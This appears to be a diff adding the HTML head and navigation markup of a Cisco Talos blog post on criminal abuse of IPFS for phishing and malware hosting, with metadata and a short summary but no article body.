@@ -1,0 +1,628 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+    <title>Threat Spotlight: Cyber Criminal Adoption of IPFS for Phishing, Malware Campaigns</title>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://blog.talosintelligence.com/assets/css/bootstrap.min.css?v=a225f65a71">
+
+    <link rel="stylesheet" href="https://blog.talosintelligence.com/assets/css/navigation.css?v=a225f65a71">
+
+    <link rel="stylesheet" href="https://blog.talosintelligence.com/assets/css/pagination.css?v=a225f65a71">
+
+    <link rel="stylesheet" href="https://blog.talosintelligence.com/assets/css/banners.css?v=a225f65a71">
+
+    <link rel="stylesheet" href="https://blog.talosintelligence.com/assets/css/style.css?v=a225f65a71">
+
+    <link rel="stylesheet" href="https://blog.talosintelligence.com/assets/css/prism.css?v=a225f65a71">
+    <link rel="stylesheet" href="https://blog.talosintelligence.com/assets/css/prism-vsc-dark-plus.css?v=a225f65a71">
+    <link rel="stylesheet" href="https://blog.talosintelligence.com/assets/css/prism-talos.css?v=a225f65a71">
+
+    <link rel="stylesheet" href="https://blog.talosintelligence.com/assets/css/landing-page.css?v=a225f65a71">
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;1,100;1,300;1,400&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Mono:wght@400;500&family=Roboto:ital,wght@0,100;0,300;0,400;0,500;1,100;1,300;1,400&display=swap" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/ghost-theme-utils@latest/dist/css/style.min.css" rel="stylesheet">
+
+
+    <link rel="icon" href="https://blog.talosintelligence.com/content/images/size/w256h256/2022/07/talos_o_square.png" type="image/png">
+    <link rel="canonical" href="https://blog.talosintelligence.com/ipfs-abuse/">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    
+    <meta property="og:site_name" content="Cisco Talos Blog">
+    <meta property="og:type" content="article">
+    <meta property="og:title" content="Threat Spotlight: Cyber Criminal Adoption of IPFS for Phishing, Malware Campaigns">
+    <meta property="og:description" content="* The InterPlanetary File System (IPFS) is an emerging Web3 technology that is currently seeing widespread abuse by threat actors.
+ * Cisco Talos has observed multiple ongoing campaigns that leverage the IPFS network to host their malware payloads and phishing kit infrastructure while facilitating other attacks.
+ * IPFS is often used for legitimate">
+    <meta property="og:url" content="https://blog.talosintelligence.com/ipfs-abuse/">
+    <meta property="og:image" content="https://blog.talosintelligence.com/content/images/2022/11/image14.png">
+    <meta property="article:published_time" content="2022-11-09T13:00:17.000Z">
+    <meta property="article:modified_time" content="2022-12-14T13:20:14.000Z">
+    <meta property="article:tag" content="Threat Spotlight">
+    <meta property="article:tag" content="Threats">
+    <meta property="article:tag" content="SecureX">
+    
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Threat Spotlight: Cyber Criminal Adoption of IPFS for Phishing, Malware Campaigns">
+    <meta name="twitter:description" content="* The InterPlanetary File System (IPFS) is an emerging Web3 technology that is currently seeing widespread abuse by threat actors.
+ * Cisco Talos has observed multiple ongoing campaigns that leverage the IPFS network to host their malware payloads and phishing kit infrastructure while facilitating other attacks.
+ * IPFS is often used for legitimate">
+    <meta name="twitter:url" content="https://blog.talosintelligence.com/ipfs-abuse/">
+    <meta name="twitter:image" content="https://blog.talosintelligence.com/content/images/2022/11/image14.png">
+    <meta name="twitter:label1" content="Written by">
+    <meta name="twitter:data1" content="Edmund Brumaghin">
+    <meta name="twitter:label2" content="Filed under">
+    <meta name="twitter:data2" content="Threat Spotlight, Threats, SecureX">
+    <meta name="twitter:site" content="@TalosSecurity">
+    <meta property="og:image:width" content="1001">
+    <meta property="og:image:height" content="501">
+    
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "publisher": {
+        "@type": "Organization",
+        "name": "Cisco Talos Blog",
+        "url": "https://blog.talosintelligence.com/",
+        "logo": {
+            "@type": "ImageObject",
+            "url": "https://blog.talosintelligence.com/content/images/2022/11/TalosBrand_ukraine.svg"
+        }
+    },
+    "author": {
+        "@type": "Person",
+        "name": "Edmund Brumaghin",
+        "url": "https://blog.talosintelligence.com/author/edmund-brumaghin/",
+        "sameAs": []
+    },
+    "headline": "Threat Spotlight: Cyber Criminal Adoption of IPFS for Phishing, Malware Campaigns",
+    "url": "https://blog.talosintelligence.com/ipfs-abuse/",
+    "datePublished": "2022-11-09T13:00:17.000Z",
+    "dateModified": "2022-12-14T13:20:14.000Z",
+    "image": {
+        "@type": "ImageObject",
+        "url": "https://blog.talosintelligence.com/content/images/2022/11/image14.png",
+        "width": 1001,
+        "height": 501
+    },
+    "keywords": "Threat Spotlight, Threats, SecureX",
+    "description": " * The InterPlanetary File System (IPFS) is an emerging Web3 technology that is currently seeing widespread abuse by threat actors.\n * Cisco Talos has observed multiple ongoing campaigns that leverage the IPFS network to host their malware payloads and phishing kit infrastructure while facilitating other attacks.\n * IPFS is often used for legitimate purposes, which makes it more difficult for security teams to differentiate between benign and malicious IPFS activity in their networks.\n * Multipl",
+    "mainEntityOfPage": "https://blog.talosintelligence.com/ipfs-abuse/"
+}
+    </script>
+
+    <meta name="generator" content="Ghost 5.75">
+    <link rel="alternate" type="application/rss+xml" title="Cisco Talos Blog" href="https://blog.talosintelligence.com/rss/">
+    
+    <script defer src="https://cdn.jsdelivr.net/ghost/sodo-search@~1.1/umd/sodo-search.min.js" data-key="4ffb0139d74ada998f4b141e4d" data-styles="https://cdn.jsdelivr.net/ghost/sodo-search@~1.1/umd/main.css" data-sodo-search="https://cisco-talos-blog.ghost.io/" crossorigin="anonymous"></script>
+    
+    <link href="https://blog.talosintelligence.com/webmentions/receive/" rel="webmention">
+    <script defer src="/public/cards.min.js?v=a225f65a71"></script>
+    <link rel="stylesheet" type="text/css" href="/public/cards.min.css?v=a225f65a71">
+    <style type='text/css'>
+    img[src*="icon_check_white.svg"] { width: 20px; margin-left: 0px; margin-right: auto; }
+    
+    #ghost-portal-root { display: none; }
+</style>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-F45RVJG3BK"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-F45RVJG3BK');
+</script>
+<style>:root {--ghost-accent-color: #006db6;}</style>
+</head>
+
+<body class="post-template tag-threat-spotlight tag-threats tag-securex-3">
+
+    <div id="mobile-page-header" class="desktop-hide">
+    <h1>Cisco Talos Blog</h1>
+</div>
+<input id="nav-trigger" class="nav-trigger" type="checkbox"/>
+<label for="nav-trigger">
+    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="22px" height="16px" viewBox="0 0 22 16">
+        <g id="menu-icon">
+            <path fill="#FFFFFF" d="M20.5,3h-19C0.672,3,0,2.329,0,1.5S0.672,0,1.5,0h19C21.328,0,22,0.671,22,1.5S21.328,3,20.5,3z"></path>
+            <path fill="#FFFFFF" d="M20.5,9.5h-19C0.672,9.5,0,8.828,0,8c0-0.829,0.672-1.5,1.5-1.5h19C21.328,6.5,22,7.171,22,8   C22,8.828,21.328,9.5,20.5,9.5z"></path>
+            <path fill="#FFFFFF" d="M20.5,16h-19C0.672,16,0,15.328,0,14.5S0.672,13,1.5,13h19c0.828,0,1.5,0.672,1.5,1.5S21.328,16,20.5,16z"></path>
+        </g>
+    </svg>
+</label>
+<nav id="nav">
+    <div id="top-nav-bar">
+    </div>
+
+    <div id="navigation">
+        <div class="navigation-logos-wrapper">
+            <div id="talos-logo-wrapper">
+                <a class="navbar-brand" href="https://talosintelligence.com">
+                </a>
+            </div>
+        </div>
+        <div class="navigation-links-wrapper">
+            <ul class="main-nav-list">
+                <li class="nav-item">
+                    <a class="primary_nav_link" href="https://talosintelligence.com/software">
+                        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1" x="0px" y="0px" viewBox="0 0 20 20" style="enable-background:new 0 0 20 20;" xml:space="preserve">
+                            <style type="text/css">
+                                .white{fill:#FFFFFF;}
+                            </style>
+                            <path class="white" d="M19.4,17.1c0,0.1-0.1,0-0.2,0c0,0-1.3-0.9-2-1.4c-0.2-0.1-0.5-0.1-0.6,0.1c-0.3,0.3-0.6,0.8-0.9,1.3  c-0.1,0.2-0.1,0.5,0.1,0.6l2,1.5c0.1,0,0,0.1,0.1,0.2c0,0.1,0,0.1-0.1,0.2c-1.2,0.5-2.6,0.2-3.5-0.7c-0.8-0.9-1-2-0.7-3.1L4.5,6.5  c-1,0.3-2.3,0-3-0.9c-0.8-0.9-1.1-1.7-1-2.7c0-0.1,0-0.1,0.1-0.2c0.1,0,0.2,0.1,0.2,0.1l2,1.5C3,4.4,3.3,4.5,3.4,4.2  c0,0,0.5-0.8,0.9-1.3c0.1-0.2,0.1-0.5-0.1-0.6L2.3,0.9c-0.1,0,0-0.1-0.1-0.3c0-0.1,0-0.1,0.1-0.2C3.5-0.1,5,0.2,5.8,1.1  c0.8,0.9,1,2,0.7,3.1l9.1,9.3c1-0.3,2.3,0,3,0.9c0.7,0.7,0.9,1.5,0.9,2.5C19.5,16.9,19.5,17,19.4,17.1z"></path>
+                        </svg>
+                        <span>Software</span>
+                    </a>
+                </li>
+                <li class="nav-item">
+                    <div class="primary-link-wrapper">
+                        <a class="primary_nav_link" href="https://talosintelligence.com/vulnerability_info">
+                            <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="26px" height="20px" viewBox="0 0 26 20">
+                                <g id="vuln-icon" class="nav-icon">
+                                    <path fill="#FFFFFF" d="M24.256,18.49L13.872,0.503C13.692,0.192,13.36,0,13,0c-0.359,0-0.692,0.192-0.872,0.503L1.744,18.49  c-0.18,0.312-0.18,0.695,0,1.006C1.924,19.809,2.257,20,2.616,20h20.769c0.359,0,0.691-0.191,0.871-0.504  C24.436,19.186,24.436,18.803,24.256,18.49 M14.268,18.215h-2.533v-1.85h2.533V18.215z M14.268,15.441h-2.533L10.89,6.515h4.222  L14.268,15.441z"></path>
+                                </g>
+                            </svg>
+                            <span>Vulnerability Information</span>
+                        </a>
+                    </div>
+                    <input class="sub-nav-trigger" id="vuln-sub-trigger" type="checkbox">
+                    <label class="sub-nav-trigger-label" for="vuln-sub-trigger">
+                        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="48.167px" height="47.75px" viewBox="0 0 48.167 47.75">
+                            <circle opacity="0.4" fill="none" stroke="#FFFFFF" stroke-miterlimit="10" cx="24.083" cy="23.875" r="22"></circle>
+                            <g>
+                                <circle fill="#FFFFFF" cx="24.083" cy="16.068" r="2.496"></circle>
+                                <circle fill="#FFFFFF" cx="24.083" cy="23.875" r="2.496"></circle>
+                                <circle fill="#FFFFFF" cx="24.083" cy="31.682" r="2.496"></circle>
+                            </g>
+                        </svg>
+                    </label>
+                    <ul class="sub-nav">
+                        <li class="desktop-hide">
+                            <a href="https://talosintelligence.com/vulnerability_info">
+                                <h4>Vulnerability Information</h4>
+                            </a>
+                        </li>
+                        <li class="desktop-hide">
+                            <label class="subnav-back-button" for="vuln-sub-trigger">BACK</label>
+                        </li>
+                        <li><a href="https://talosintelligence.com/vulnerability_reports">Vulnerability Reports</a></li>
+                        <li><a href="https://talosintelligence.com/ms_advisories">Microsoft Advisories</a></li>
+                    </ul>
+                    <div class="desktop-hide subnav-overlay">
+                        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="26px" height="20px" viewBox="0 0 26 20">
+                            <g id="vuln-icon" class="nav-icon">
+                                <path fill="#FFFFFF" d="M24.256,18.49L13.872,0.503C13.692,0.192,13.36,0,13,0c-0.359,0-0.692,0.192-0.872,0.503L1.744,18.49  c-0.18,0.312-0.18,0.695,0,1.006C1.924,19.809,2.257,20,2.616,20h20.769c0.359,0,0.691-0.191,0.871-0.504  C24.436,19.186,24.436,18.803,24.256,18.49 M14.268,18.215h-2.533v-1.85h2.533V18.215z M14.268,15.441h-2.533L10.89,6.515h4.222  L14.268,15.441z"></path>
+                            </g>
+                        </svg>
+                    </div>
+                </li>
+                <li class="nav-item">
+                    <div class="primary-link-wrapper">
+                        <a class="primary_nav_link" href="https://talosintelligence.com/reputation">
+                            <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1" x="0px" y="0px" viewBox="0 0 20 20" height="20px" width="20px" style="enable-background:new 0 0 20 20;" xml:space="preserve">
+                                <style type="text/css">
+                                    .white{fill:#FFFFFF;}
+                                </style>
+                                <g>
+                                <path class="white" d="M19.5,9.5h-1.1c-0.3-4.2-3.6-7.6-7.8-7.8V0.5C10.5,0.2,10.3,0,10,0l0,0C9.7,0,9.5,0.2,9.5,0.5l0,0v1.1   C5.3,1.9,1.9,5.3,1.6,9.5H0.5C0.2,9.5,0,9.7,0,10s0.2,0.5,0.5,0.5l0,0h1.1c0.3,4.2,3.6,7.6,7.8,7.8v1.1c0,0.3,0.2,0.5,0.5,0.5l0,0   c0.3,0,0.5-0.2,0.5-0.5l0,0v-1.1c4.2-0.3,7.6-3.6,7.8-7.8h1.1c0.3,0,0.5-0.2,0.5-0.5C20,9.7,19.8,9.5,19.5,9.5 M16.6,10.5h0.7   c-0.3,3.6-3.2,6.5-6.8,6.8v-0.8c0-0.3-0.2-0.5-0.5-0.5l0,0c-0.3,0-0.5,0.2-0.5,0.5v0.8C5.8,17,3,14.2,2.7,10.5h0.8   C3.8,10.5,4,10.3,4,10S3.8,9.5,3.5,9.5l0,0H2.7C3,5.8,5.8,3,9.5,2.7v0.8C9.5,3.7,9.7,4,10,4l0,0c0.3,0,0.5-0.2,0.5-0.5V2.7   C14.2,3,17,5.8,17.3,9.5h-0.7c-0.3,0-0.5,0.2-0.5,0.5C16.1,10.3,16.3,10.5,16.6,10.5L16.6,10.5"></path>
+                                    <circle class="white" cx="10" cy="10" r="3.2"></circle>
+                                </g>
+                            </svg>
+                            <span>
+                                Reputation Center
+                            </span>
+                        </a>
+                    </div>
+                    <input class="sub-nav-trigger" id="reputation-sub-trigger" type="checkbox">
+                    <label class="sub-nav-trigger-label" for="reputation-sub-trigger">
+                        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="48.167px" height="47.75px" viewBox="0 0 48.167 47.75">
+                            <circle opacity="0.4" fill="none" stroke="#FFFFFF" stroke-miterlimit="10" cx="24.083" cy="23.875" r="22"></circle>
+                            <g>
+                                <circle fill="#FFFFFF" cx="24.083" cy="16.068" r="2.496"></circle>
+                                <circle fill="#FFFFFF" cx="24.083" cy="23.875" r="2.496"></circle>
+                                <circle fill="#FFFFFF" cx="24.083" cy="31.682" r="2.496"></circle>
+                            </g>
+                        </svg>
+                    </label>
+                    <ul class="sub-nav">
+                        <li class="desktop-hide">
+                            <a href="https://talosintelligence.com/reputation">
+                                <h4>Reputation Center</h4>
+                            </a>
+                        </li>
+                        <li class="desktop-hide">
+                            <label class="subnav-back-button" for="reputation-sub-trigger">BACK</label>
+                        </li>
+                        <li><a data-method="get" href="https://talosintelligence.com/reputation_center">IP &amp; Domain Reputation</a></li>
+                        <li><a href="https://talosintelligence.com/talos_file_reputation">Talos File Reputation</a></li>
+                        <li><a href="https://talosintelligence.com/amp-naming">Secure Endpoint Naming Conventions</a></li>
+                        <li><a href="https://talosintelligence.com/categories">Intelligence Categories</a></li>
+                    </ul>
+                    <div class="desktop-hide subnav-overlay">
+                        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1" x="0px" y="0px" viewBox="0 0 20 20" height="20px" width="20px" style="enable-background:new 0 0 20 20;" xml:space="preserve">
+                            <style type="text/css">
+                                .white{fill:#FFFFFF;}
+                            </style>
+                            <g>
+                            <path class="white" d="M19.5,9.5h-1.1c-0.3-4.2-3.6-7.6-7.8-7.8V0.5C10.5,0.2,10.3,0,10,0l0,0C9.7,0,9.5,0.2,9.5,0.5l0,0v1.1   C5.3,1.9,1.9,5.3,1.6,9.5H0.5C0.2,9.5,0,9.7,0,10s0.2,0.5,0.5,0.5l0,0h1.1c0.3,4.2,3.6,7.6,7.8,7.8v1.1c0,0.3,0.2,0.5,0.5,0.5l0,0   c0.3,0,0.5-0.2,0.5-0.5l0,0v-1.1c4.2-0.3,7.6-3.6,7.8-7.8h1.1c0.3,0,0.5-0.2,0.5-0.5C20,9.7,19.8,9.5,19.5,9.5 M16.6,10.5h0.7   c-0.3,3.6-3.2,6.5-6.8,6.8v-0.8c0-0.3-0.2-0.5-0.5-0.5l0,0c-0.3,0-0.5,0.2-0.5,0.5v0.8C5.8,17,3,14.2,2.7,10.5h0.8   C3.8,10.5,4,10.3,4,10S3.8,9.5,3.5,9.5l0,0H2.7C3,5.8,5.8,3,9.5,2.7v0.8C9.5,3.7,9.7,4,10,4l0,0c0.3,0,0.5-0.2,0.5-0.5V2.7   C14.2,3,17,5.8,17.3,9.5h-0.7c-0.3,0-0.5,0.2-0.5,0.5C16.1,10.3,16.3,10.5,16.6,10.5L16.6,10.5"></path>
+                                <circle class="white" cx="10" cy="10" r="3.2"></circle>
+                            </g>
+                        </svg>
+                    </div>
+                </li>
+                <li class="nav-item">
+                    <a class="primary_nav_link" href="https://support.talosintelligence.com/">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="26px" height="20px" viewBox="0 0 123.17 159.292">
+                            <path d="M61.59,0,0,17.069v85.32c0,23.472,61.59,56.9,61.59,56.9s61.58-36.288,61.58-56.9V17.069Zm-.433,149.746C38.314,136.662,8.128,114.3,8.128,102.389V23.239l53.029-14.7Z" fill="#fff"></path>
+                        </svg>
+                        <span>Support</span>
+                    </a>
+                </li>
+                <li class="nav-item">
+                    <a class="primary_nav_link" href="https://talosintelligence.com/incident_response">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="111.588" height="148.311" viewBox="0 0 111.588 148.311">
+                            <path d="M1.181,128.446v15.7a4.167,4.167,0,0,0,4.167,4.167h100.9a4.167,4.167,0,0,0,4.167-4.167v-15.7a4.167,4.167,0,0,0-4.167-4.167H5.348a4.167,4.167,0,0,0-4.167,4.166M55.8,63.109a3.277,3.277,0,1,1,0,6.553c-10.344,0-20.755,8.578-20.755,18.57a3.277,3.277,0,1,1-6.554,0C28.489,73.947,41.93,63.109,55.8,63.109Zm0-12.016c-21.787,0-39.325,17.81-39.325,39.937v26.7H95.122V91.03c0-22.128-17.537-39.937-39.324-39.937m52.365-38.3a3.291,3.291,0,0,0-2.254,1.024L88.432,31.294a3.283,3.283,0,0,0,4.642,4.644l17.478-17.479a3.278,3.278,0,0,0-2.389-5.666m-105.138,0a3.276,3.276,0,0,0-1.98,5.666L18.522,35.938a3.283,3.283,0,0,0,4.643-4.644L5.687,13.817A3.255,3.255,0,0,0,3.025,12.793ZM55.389.026a3.276,3.276,0,0,0-2.867,3.345V19.642a3.277,3.277,0,1,0,6.554,0V3.371A3.283,3.283,0,0,0,55.389.026Z" fill="#fff"></path>
+                        </svg>
+                        <span>Incident Response</span>
+                    </a>
+                </li>
+
+                <li class="nav-item">
+                    <a class="primary_nav_link" href="https://talosintelligence.com/careers">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="153.816" height="90" viewBox="0 0 153.816 90">
+                            <g>
+                                <path d="M56.336,47.451a31.328,31.328,0,0,0-17.1-10.872A19.564,19.564,0,0,0,50.91,19.1C50.91,8.868,42.008,0,31.735,0S12.559,8.868,12.559,19.1A19.564,19.564,0,0,0,24.22,36.574,31.239,31.239,0,0,0,0,66.717c0,2.343,12.671,10.9,31.883,10.9a63.142,63.142,0,0,0,6.536-.341,37,37,0,0,1,8.222-21.367,38.039,38.039,0,0,1,9.7-8.456" fill="#fff" fill-rule="evenodd"></path>
+                                <path d="M106.731,70.729a32.386,32.386,0,0,0-1.889-4.815c-.014-.029-.028-.058-.043-.087a32.308,32.308,0,0,0-2.568-4.335c-.033-.047-.066-.095-.1-.142-.312-.436-.631-.866-.964-1.287l-.015-.02a32.215,32.215,0,0,0-2.185-2.483l-.166-.168c-.369-.372-.745-.737-1.131-1.09l-.025-.024c-.415-.379-.838-.744-1.272-1.1l-.081-.064q-.582-.474-1.189-.92l-.217-.159c-.43-.312-.866-.616-1.313-.9h0a31.084,31.084,0,0,0-9.679-4.164A19.564,19.564,0,0,0,95.566,31.488c0-10.234-8.9-19.1-19.175-19.1s-19.176,8.868-19.176,19.1A19.564,19.564,0,0,0,68.876,48.96a31.828,31.828,0,0,0-9.109,3.733h0a31.8,31.8,0,0,0-6.941,5.668l-.045.05a31.3,31.3,0,0,0-2.243,2.738l-.024.034q-.5.693-.969,1.415c-.014.023-.03.047-.046.07a31.053,31.053,0,0,0-1.7,3.019c-.028.059-.057.117-.085.175a30.16,30.16,0,0,0-1.33,3.185c-.02.056-.038.112-.058.169q-.255.741-.474,1.5c-.019.065-.039.13-.057.2a30.092,30.092,0,0,0-.741,3.374c-.015.094-.03.188-.044.282-.084.56-.158,1.123-.211,1.693v.007c-.087.935-.135,1.88-.135,2.834,0,2.343,12.671,10.9,31.883,10.9s31.583-8.555,31.583-10.9a32.8,32.8,0,0,0-1.384-8.35l-.007-.023" fill="#fff" fill-rule="evenodd"></path>
+                                <path d="M129.588,36.579A19.564,19.564,0,0,0,141.261,19.1c0-10.234-8.9-19.1-19.175-19.1S102.91,8.868,102.91,19.1a19.562,19.562,0,0,0,11.66,17.472A31.817,31.817,0,0,0,96.916,47.859a38.586,38.586,0,0,1,17.373,29.253,63.062,63.062,0,0,0,7.945.5c19.212,0,31.582-8.554,31.582-10.9a31.947,31.947,0,0,0-24.228-30.138" fill="#fff" fill-rule="evenodd"></path>
+                            </g>
+                        </svg>
+                        <span>Careers</span>
+                    </a>
+                </li>
+
+                <li class="nav-item">
+                    <div class="primary-link-wrapper">
+                        <a id="link_blog" class="primary_nav_link" href="https://blog.talosintelligence.com">
+                            <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1" x="0px" y="0px" width="260px" height="296.5px" viewBox="0 0 260 296.5" enable-background="new 0 0 260 296.5" xml:space="preserve">
+                                <path fill="#FFFFFF" d="M243.586,42.404h-14.448c-0.943-4.513-3.143-8.813-6.616-12.33L201.793,9.098  c-4.7-4.757-10.972-7.377-17.66-7.377c-6.578,0-12.777,2.547-17.457,7.173l-33.875,33.511H17.586c-6.6,0-12,5.399-12,12V226.28  c0,6.6,5.4,12,12,12H153.83l84.21,56.278l-27.448-56.278h32.994c6.6,0,12-5.4,12-12V54.404  C255.586,47.804,250.186,42.404,243.586,42.404z M214.662,48.045c-0.01,0.2-0.021,0.399-0.044,0.599  c-0.008,0.069-0.021,0.139-0.031,0.207c-0.046,0.345-0.113,0.688-0.196,1.026c-0.034,0.137-0.063,0.273-0.103,0.408  c-0.039,0.135-0.087,0.267-0.133,0.399c-0.051,0.151-0.102,0.302-0.16,0.45c-0.049,0.126-0.105,0.249-0.16,0.373  c-0.068,0.153-0.139,0.307-0.216,0.457c-0.059,0.116-0.12,0.23-0.184,0.345c-0.088,0.157-0.181,0.312-0.278,0.465  c-0.065,0.104-0.13,0.206-0.2,0.308c-0.115,0.168-0.239,0.33-0.366,0.492c-0.064,0.081-0.124,0.165-0.19,0.244  c-0.199,0.238-0.409,0.472-0.635,0.694L82.458,182.308l-47.932,12.871l13.427-47.74L177.223,19.561  c1.917-1.895,4.414-2.84,6.911-2.84c2.534,0,5.068,0.975,6.99,2.92l20.726,20.974c0.545,0.552,1.002,1.156,1.39,1.79  c0.574,0.938,0.975,1.951,1.206,2.993c0.004,0.021,0.01,0.04,0.014,0.06c0.049,0.226,0.086,0.453,0.119,0.682  c0.008,0.06,0.017,0.118,0.024,0.178c0.026,0.211,0.045,0.424,0.058,0.636c0.004,0.077,0.007,0.153,0.009,0.23  c0.007,0.203,0.011,0.407,0.005,0.61C214.673,47.877,214.666,47.961,214.662,48.045z"></path>
+                            </svg>
+                            <span>Blog</span>
+                        </a>
+                    </div>
+                    <input id="blog-sub-trigger" class="sub-nav-trigger" type="checkbox"/>
+                    <label class="sub-nav-trigger-label" for="blog-sub-trigger">
+                        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="48.167px" height="47.75px" viewBox="0 0 48.167 47.75">
+                            <circle opacity="0.4" fill="none" stroke="#FFFFFF" stroke-miterlimit="10" cx="24.083" cy="23.875" r="22"></circle>
+                            <g>
+                                <circle fill="#FFFFFF" cx="24.083" cy="16.068" r="2.496"></circle>
+                                <circle fill="#FFFFFF" cx="24.083" cy="23.875" r="2.496"></circle>
+                                <circle fill="#FFFFFF" cx="24.083" cy="31.682" r="2.496"></circle>
+                            </g>
+                        </svg>
+                    </label>
+                    <ul class="sub-nav">
+                        <li class="desktop-hide">
+                            <a href="https://blog.talosintelligence.com">
+                                <h4>Blog</h4>
+                            </a>
+                        </li>
+                        <li class="desktop-hide">
+                            <label class="subnav-back-button" for="blog-sub-trigger">BACK</label>
+                        </li>
+                        <li>
+                            <a href="https://blog.talosintelligence.com">Talos Blog</a>
+                        </li>
+                        <li>
+                            <a href="https://blog.talosintelligence.com/category/threat-source-newsletter/">Talos Threat Source Newsletter</a>
+                        </li>
+                    </ul>
+                    <div class="desktop-hide subnav-overlay">
+                        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1" x="0px" y="0px" width="20px" height="20px" viewBox="0 0 260 296.5" enable-background="new 0 0 260 296.5" xml:space="preserve">
+                            <path fill="#FFFFFF" d="M243.586,42.404h-14.448c-0.943-4.513-3.143-8.813-6.616-12.33L201.793,9.098  c-4.7-4.757-10.972-7.377-17.66-7.377c-6.578,0-12.777,2.547-17.457,7.173l-33.875,33.511H17.586c-6.6,0-12,5.399-12,12V226.28  c0,6.6,5.4,12,12,12H153.83l84.21,56.278l-27.448-56.278h32.994c6.6,0,12-5.4,12-12V54.404  C255.586,47.804,250.186,42.404,243.586,42.404z M214.662,48.045c-0.01,0.2-0.021,0.399-0.044,0.599  c-0.008,0.069-0.021,0.139-0.031,0.207c-0.046,0.345-0.113,0.688-0.196,1.026c-0.034,0.137-0.063,0.273-0.103,0.408  c-0.039,0.135-0.087,0.267-0.133,0.399c-0.051,0.151-0.102,0.302-0.16,0.45c-0.049,0.126-0.105,0.249-0.16,0.373  c-0.068,0.153-0.139,0.307-0.216,0.457c-0.059,0.116-0.12,0.23-0.184,0.345c-0.088,0.157-0.181,0.312-0.278,0.465  c-0.065,0.104-0.13,0.206-0.2,0.308c-0.115,0.168-0.239,0.33-0.366,0.492c-0.064,0.081-0.124,0.165-0.19,0.244  c-0.199,0.238-0.409,0.472-0.635,0.694L82.458,182.308l-47.932,12.871l13.427-47.74L177.223,19.561  c1.917-1.895,4.414-2.84,6.911-2.84c2.534,0,5.068,0.975,6.99,2.92l20.726,20.974c0.545,0.552,1.002,1.156,1.39,1.79  c0.574,0.938,0.975,1.951,1.206,2.993c0.004,0.021,0.01,0.04,0.014,0.06c0.049,0.226,0.086,0.453,0.119,0.682  c0.008,0.06,0.017,0.118,0.024,0.178c0.026,0.211,0.045,0.424,0.058,0.636c0.004,0.077,0.007,0.153,0.009,0.23  c0.007,0.203,0.011,0.407,0.005,0.61C214.673,47.877,214.666,47.961,214.662,48.045z"></path>
+                        </svg>
+
+                    </div>
+                </li>
+
+                <li class="nav-item">
+                    <div class="primary-link-wrapper">
+                        <a class="primary_nav_link" href="https://talosintelligence.com/podcasts">
+                            <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="podcast-icon-nav" x="0px" y="0px" viewBox="0 0 71.8 75" width="26px" height="20px" style="enable-background:new 0 0 71.8 75;" xml:space="preserve">
+                                <style type="text/css">
+                                    .podcast-fill{fill:#fff;}
+                                </style>
+                                <path class="podcast-fill" d="M21.8,15.1c0-7.8,6.3-14.1,14.1-14.1c7.8,0,14.1,6.3,14.1,14.1v25.4c0,7.8-6.3,14.1-14.1,14.1  c-7.8,0-14.1-6.3-14.1-14.1V15.1z M59.9,40.1c0,12.4-9.4,22.6-21.5,23.9v3.6h12.8c1.4,0,2.6,1.2,2.6,2.6c0,1.4-1.2,2.6-2.6,2.6H20.4  c-1.4,0-2.6-1.2-2.6-2.6c0-1.4,1.2-2.6,2.6-2.6h12.8V64c-12-1.3-21.5-11.5-21.5-23.9v-6.8c0-1.4,1.2-2.6,2.6-2.6  c1.4,0,2.6,1.2,2.6,2.6v6.8c0,10.4,8.5,18.8,18.8,18.8c10.4,0,18.8-8.5,18.8-18.9v-6.8c0-1.4,1.2-2.6,2.6-2.6c1.4,0,2.6,1.2,2.6,2.6  V40.1z"></path>
+                            </svg>
+
+                            <span>
+                                Podcasts
+                            </span>
+                        </a>
+                    </div>
+                    <input class="sub-nav-trigger" id="podcast-sub-trigger" type="checkbox">
+                    <label class="sub-nav-trigger-label" for="podcast-sub-trigger">
+                        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="48.167px" height="47.75px" viewBox="0 0 48.167 47.75">
